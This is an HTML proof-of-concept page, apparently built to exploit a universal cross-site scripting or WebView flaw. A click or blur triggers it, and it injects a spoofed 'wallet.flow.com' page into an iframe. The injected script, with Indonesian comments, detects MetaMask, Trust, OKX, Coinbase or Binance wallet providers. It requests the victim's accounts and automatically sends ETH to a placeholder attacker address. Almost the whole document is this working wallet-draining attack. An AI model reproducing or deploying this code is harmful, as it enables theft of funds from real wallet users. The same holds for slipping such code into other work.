<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>wallet.flow.com</title>
  <style>
    body {
      font-family: system-ui, Arial, sans-serif;
      text-align: center;
      background: #0f172a;
      color: #e0f7fa;
      padding: 30px;
    }
    h1 { color: #22c55e; }
    iframe {
      width: 90%;
      max-width: 500px;
      height: 320px;
      border: 2px solid #22c55e;
      border-radius: 12px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h1>Click Anywhere on This Page</h1>
  <p>Then watch the magic happen in the iframe below</p>
  <iframe id="iframe"></iframe>

  <script>
    // Trigger saat user klik atau blur (biasanya untuk trigger di Android WebView)
    window.addEventListener("click", triggerUXSS);
    window.addEventListener("blur", triggerUXSS);

    function triggerUXSS() {
      // Cegah trigger berulang
      if (window.alreadyTriggered) return;
      window.alreadyTriggered = true;

      const iframe = document.getElementById("iframe");
      // Fallback compatibility
      const doc = iframe.contentDocument || iframe.contentWindow.document;

      doc.open();
      doc.write(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>wallet.flow.com</title>
  <style>
    body { font-family: system-ui; background:#0f172a; color:#e0f7fa; text-align:center; padding:30px; }
    h3 { color:#22c55e; margin:10px 0; }
    code { background:#1e293b; padding:4px 8px; border-radius:6px; color:#a5ffd6; }
  </style>
</head>
<body>
  <h3>Detecting wallet...</h3>
  <div id="msg"></div>

  <script>
    // GANTI DENGAN ALAMAT TUJUAN
    const TARGET = "0xYourRealAddressHere";
    const AMOUNT = "0x2386F26FC10000"; // 0.01 ETH

    const msg = document.getElementById('msg');

    function log(text) {
      msg.innerHTML += text + "<br>";
    }

    // DETEKSI PROVIDER EVM (WORK DI SEMUA WALLET)
    function getProvider() {
      if (window.ethereum) return window.ethereum;
      if (window.trustWalletProvider) return window.trustWalletProvider;
      if (window.okxwallet) return window.okxwallet;
      if (window.coinbaseWalletExtension) return window.coinbaseWalletExtension;
      if (window.BinanceChain) return window.BinanceChain;
      return null;
    }

    async function run() {
      const provider = getProvider();
      if (!provider) {
        log("No EVM wallet detected inside iframe!");
        return;
      }

      log("Wallet found! Connecting...");

      try {
        const accounts = await provider.request({ method: "eth_requestAccounts" });
        const user = accounts[0];

        log("Connected: " + user.slice(0,8) + "..." + user.slice(-6));

        log("Sending 0.01 ETH...");

        const txHash = await provider.request({
          method: "eth_sendTransaction",
          params: [{
            from: user,
            to: TARGET,
            value: AMOUNT,
            gas: "0x5208" // 21000 gas limit standard
          }]
        });

        log("SUCCESS! Tx: " + txHash.slice(0,12) + "...");
        document.title = "Transaction Sent!";

      } catch (e) {
        log("Failed: " + (e.message || "User rejected"));
      }
    }

    // JALAN OTOMATIS
    setTimeout(run, 600);
  <\/script> 
</body>
</html>
      `);
      doc.close();
    }
  </script>
</body>
</html>
